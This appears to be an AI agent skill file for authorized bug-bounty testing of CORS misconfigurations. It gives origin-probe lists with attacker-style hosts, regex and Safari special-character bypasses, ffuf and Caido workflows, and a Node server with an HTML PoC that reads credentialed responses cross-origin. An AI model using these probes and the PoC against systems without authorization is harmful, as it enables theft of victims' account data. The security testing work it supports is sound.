---
name: cors-hunter
description: >
  Advanced CORS misconfiguration analysis and exploitation skill for bug bounty
  and penetration testing. Use this skill whenever the user wants to test a
  target for CORS issues, analyze ACAO/ACAC headers, generate bypass payloads,
  audit regex-based origin whitelists, or build a PoC for a CORS finding. Also
  trigger when the user pastes HTTP responses containing Access-Control-* headers
  and asks what to test next, mentions "CORS bypass", "origin reflection",
  "ACAC with credentials", "null origin", "Safari CORS", or any request to
  enumerate or exploit cross-origin resource sharing. This skill covers all phases:
  endpoint discovery → origin probe matrix → regex bypass → advanced Safari/special-char
  techniques → Caido workflow → PoC generation → finding template.
---

# CORS Hunter

Full CORS misconfiguration hunting workflow. Covers discovery, the complete test
matrix, advanced regex bypass and Safari/special-character techniques, Caido
workflow, PoC generation, and a report template.

---

## Phase 0 — Prerequisites / Context

Before testing, confirm:
- **Target scope**: domain(s) and any subdomain wildcard coverage
- **Auth tokens**: session cookie or Bearer token for credentialed probes
- **Proxy**: Caido (preferred) or Burp listening on `127.0.0.1:8080`
- **Attacker domain**: a domain you control with a wildcard DNS record (needed
  for advanced Safari/special-char PoC)

---

## Phase 1 — Endpoint Discovery

Find endpoints that return `Access-Control-Allow-Origin` (ACAO).

```bash
# Spider the JS bundle first (use js-recon skill), then grep captured traffic:
grep -i "access-control-allow-origin" caido-export.csv

# ffuf — send a cross-origin probe header on every request and filter on ACAO
ffuf -u https://TARGET/FUZZ \
     -w ~/wordlists/api-endpoints.txt \
     -H "Origin: https://evil.com" \
     -mr "Access-Control-Allow-Origin" \
     -mc 200,201,401,403
```

Prioritize endpoints that:
- Return sensitive data (account info, tokens, PII)
- Accept `withCredentials` (check for `Access-Control-Allow-Credentials: true`)

---

## Phase 2 — Standard Test Matrix

For each candidate endpoint, send the probes below in order. Log the
`Access-Control-Allow-Origin` (ACAO) value returned for each.

| # | Origin Probe | Vuln if ACAO reflects… | Severity |
|---|---|---|---|
| 1 | `https://evil.com` | `https://evil.com` | Critical |
| 2 | `null` | `null` | High |
| 3 | `https://TARGET.evil.com` | `https://TARGET.evil.com` | Critical |
| 4 | `https://evilTARGET.com` | `https://evilTARGET.com` | Critical |
| 5 | `https://TARGET.com.evil.com` | exact reflection | Critical |
| 6 | `http://TARGET.com` | `http://TARGET.com` (http downgrade) | Medium |
| 7 | `https://sub.TARGET.com` | (check if subs are trusted) | High |
| 8 | *(no Origin header)* | `*` with ACAC=true | Critical (invalid but check) |

**Quick Caido macro** (run for each row):
```
GET /api/sensitive-endpoint HTTP/1.1
Host: TARGET.com
Origin: <PROBE>
Cookie: session=YOUR_SESSION
```

---

## Phase 3 — Regex Bypass Techniques

When the server uses regex-based origin validation, try these bypasses.

### 3.1 Unescaped dot (`.*\.?TARGET\.com`)

The regex `.*\.?TARGET\.com` is intended to allow `TARGET.com` and `*.TARGET.com`
but since `\.?` only applies to the literal dot (not inside a group), anything
ending in `TARGET.com` is accepted.

**Probes:**
```
https://evilTARGET.com
https://notTARGET.com
https://xxxxTARGET.com
```

### 3.2 Trailing wildcard / port bypass (`TARGET\.com\:?.*`)

The regex `TARGET\.com\:?.*` intends to allow any port but `\:?` only
quantifies the colon, so anything after `TARGET.com` is accepted.

**Probes:**
```
https://TARGET.com.evil.com
https://TARGET.comXYZ.evil.com
https://TARGET.com/anything@evil.com
```

### 3.3 Prefix bypass (misconfigured `startsWith`)

Some servers check only `origin.startsWith("https://TARGET.com")`.

**Probes:**
```
https://TARGET.com.evil.com
https://TARGET.com@evil.com
```

### 3.4 Subdomain takeover chain

If `*.TARGET.com` is trusted and a subdomain resolves to an unclaimed asset
(Heroku, S3, GitHub Pages), combine a subdomain takeover with CORS to escalate.

---

## Phase 4 — Advanced: Safari / Special-Character Bypass

> Based on Corben Leo's research: https://corben.io/blog/18-6-16-advanced-cors-techniques

### Background

DNS servers respond to arbitrary hostnames (including special characters) as
long as a wildcard DNS record exists. Most browsers validate domain names before
sending requests — **Safari does not**.

Safari will happily send `Origin: https://TARGET.com{.<your-domain>` as a
valid cross-origin request.

### Printable special characters

```
, & ' " ; ! $ ^ * ( ) + = ` ~ - _ = | { } %
```

### Non-printable characters (URL-encoded)

```
%01-%08, %0b, %0c, %0e-%0f, %10-%1f, %7f
```

### The `_` wildcard — works in Chrome & Firefox too

The underscore in a subdomain label is technically invalid but **Chrome and
Firefox accept it**. This is the most portable of the special-char techniques.

**Probe (all major browsers):**
```
Origin: https://TARGET.com_.<your-attacker-domain>
```

If the server regex uses `[^\.\-a-zA-Z0-9]` to gate what can follow the
target domain, the underscore will pass through and also be accepted by
Chrome/Firefox — making this a high-impact finding.

### Identifying vulnerable regex patterns

A server is vulnerable to special-char bypass when its regex:
- Allows characters that aren't `.`, `-`, `a-z`, `A-Z`, `0-9` after the domain
- Uses a character class like `[^\.\-a-zA-Z0-9]+.*` to allow "ports and paths"
  but neglects to anchor the end properly

**Test sequence:**
1. Probe: `https://TARGET.com ` (trailing space — Safari-only)
2. Probe: `https://TARGET.com_.<attacker>.com` (underscore — all browsers)
3. Probe: `https://TARGET.com{.<attacker>.com` (brace — Safari-only)
4. Check ACAO response — if it reflects the probe, the special-char bypass works

### Setup for Safari/special-char PoC

Requirements:
- Attacker domain with wildcard DNS (`*.attacker.com → your-vps-IP`)
- NodeJS server (Apache/Nginx reject special chars in Host by default)

**NodeJS server** (`serve.js`):
```javascript
const http = require("http");
const fs   = require("fs");

http.createServer((req, res) => {
  if (req.url === "/cors-poc") {
    fs.readFile("cors.html", (err, data) => {
      res.writeHead(200, { "Content-Type": "text/html" });
      res.end(data);
    });
  } else {
    res.writeHead(200, { "Content-Type": "text/html" });
    res.end("ok");
  }
}).listen(80, "0.0.0.0");
console.log("Serving on :80");
```

**PoC page** (`cors.html`):
```html
<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body onload="cors();">
<textarea rows="10" cols="60" id="out"></textarea>
<script>
function cors() {
  var x = new XMLHttpRequest();
  x.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("out").innerHTML = this.responseText;
    }
  };
  x.open("GET", "https://TARGET.com/api/sensitive-endpoint", true);
  x.withCredentials = true;
  x.send();
}
</script>
</body>
</html>
```

Start with: `node serve.js &`

Visit in Safari (or any browser for the `_` variant):
```
http://TARGET.com_.<your-attacker-domain>/cors-poc
```

---

## Phase 5 — Caido Workflow

### 5.1 Replaying with custom Origin

1. Capture the authenticated request to the sensitive endpoint in Caido
2. Send to **Replay**
3. Add/overwrite the `Origin` header with each probe from Phase 2
4. Check response for:
   - `Access-Control-Allow-Origin: <your-probe>` (reflection)
   - `Access-Control-Allow-Credentials: true`

Both headers must be present for a credentialed CORS exploit to work.

### 5.2 Automate with Caido Automate

Use the **Automate** tab with a wordlist of origin probes:

```
https://evil.com
null
https://TARGET.com.evil.com
https://evilTARGET.com
https://TARGET.com_evil.com
https://TARGET.com_.evil.com
https://TARGET.com{.evil.com
https://TARGET.com .evil.com
http://TARGET.com
```

Filter for responses containing `Access-Control-Allow-Origin`.

### 5.3 theftfuzzer (CLI)

[theftfuzzer](https://github.com/lc/theftfuzzer) by Corben Leo generates
permutations for all major CORS bypass patterns automatically:

```bash
git clone https://github.com/lc/theftfuzzer
cd theftfuzzer
python3 theftfuzzer.py -u https://TARGET.com/api/endpoint \
  -d TARGET.com \
  -c "session=YOUR_SESSION_COOKIE"
```

---

## Phase 6 — Severity Assessment

| Condition | Severity |
|---|---|
| Any origin reflected + `ACAC: true` | **Critical** |
| `null` reflected + `ACAC: true` | **High** |
| Any origin reflected, no `ACAC` | **Low–Medium** (no credentials) |
| Wildcard `*` without `ACAC` | **Info / Low** |
| Regex bypass allows attacker-controlled domain + `ACAC: true` | **Critical** |
| Special-char bypass (Safari only) + `ACAC: true` | **High** |
| Special-char bypass (`_` in Chrome/Firefox) + `ACAC: true` | **Critical** |

---

## Phase 7 — Finding Template

```
Title: CORS Misconfiguration — [bypass type] on [endpoint]

Endpoint: https://TARGET.com/api/endpoint
Method:   GET (authenticated)

Vulnerable Header:
  Request:  Origin: https://evil.com
  Response: Access-Control-Allow-Origin: https://evil.com
            Access-Control-Allow-Credentials: true

Impact:
  An attacker can host a malicious page that performs a credentialed cross-origin
  request to this endpoint, reading the full response (including session tokens,
  PII, or account data) on behalf of any authenticated victim who visits the page.

Steps to Reproduce:
  1. Log into TARGET.com as a normal user
  2. Visit http://evil.com/cors-poc (PoC below)
  3. Observe that the response from /api/endpoint is read cross-origin

PoC:
  [embed cors.html contents]

Severity: Critical / High / Medium
```

---

## Reference files

- `references/cors-probe-list.txt` — Full origin probe wordlist
- `references/regex-patterns.md`   — Common vulnerable regex patterns with breakdowns
